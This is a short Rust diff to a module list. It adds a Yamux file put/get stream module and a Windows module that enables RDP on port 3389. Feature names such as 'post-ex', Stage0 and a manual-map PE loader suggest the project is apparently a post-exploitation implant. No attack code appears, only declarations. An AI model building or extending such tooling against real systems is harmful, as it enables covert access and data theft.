@@ -33,6 +33,9 @@ pub mod wire_ids;
 pub mod executor;
 #[cfg(feature = "post-ex")]
 pub mod fs;
+/// Yamux FILE (0x0E) binary put/get stream (feature-gated with FS).
+#[cfg(feature = "post-ex")]
+pub mod file_stream;
 #[cfg(feature = "post-ex")]
 pub mod process;
 
@@ -72,6 +75,9 @@ pub mod module_package;
 /// Stage0 never LoadLibrary/Manual-Map product modules — see docs/MODULE_WORKER_ISOLATION.md.
 #[cfg(feature = "module-loader")]
 pub mod module_supervisor;
+/// Enable local RDP (3389) when L2 desktop is staged (Windows).
+#[cfg(feature = "module-loader")]
+pub mod rdp_enable;
 /// Manual-Map PE loader for L2 modules (no temp DLL).
 /// Product whitelist modules must not use this path (supervisor only).
 #[cfg(all(windows, feature = "mem-map"))]
